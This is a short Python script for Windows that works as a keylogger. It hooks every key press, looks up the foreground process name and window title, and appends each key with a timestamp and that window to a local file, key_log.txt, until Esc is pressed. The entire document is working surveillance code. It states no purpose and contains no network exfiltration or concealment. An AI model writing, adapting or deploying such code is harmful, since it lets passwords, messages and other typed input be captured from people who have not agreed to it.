import keyboard
import psutil
import win32gui
import win32process
from datetime import datetime

log_file = "key_log.txt"

def get_active_window_title():
    try:
        hwnd = win32gui.GetForegroundWindow()
        _, pid = win32process.GetWindowThreadProcessId(hwnd)
        process = psutil.Process(pid)
        window_title = win32gui.GetWindowText(hwnd)
        return f"{process.name()} - {window_title}"
    except Exception as e:
        return f"Unknown Window ({str(e)})"

def on_key(event):
    window = get_active_window_title()
    now = datetime.now().strftime('%d/%m/%y %H:%M:%S')
    key = event.name

    with open(log_file, "a", encoding='utf-8') as f:
        f.write(f"[{now}] ({window}) : {key}\n")

keyboard.on_press(on_key)
keyboard.wait('esc')
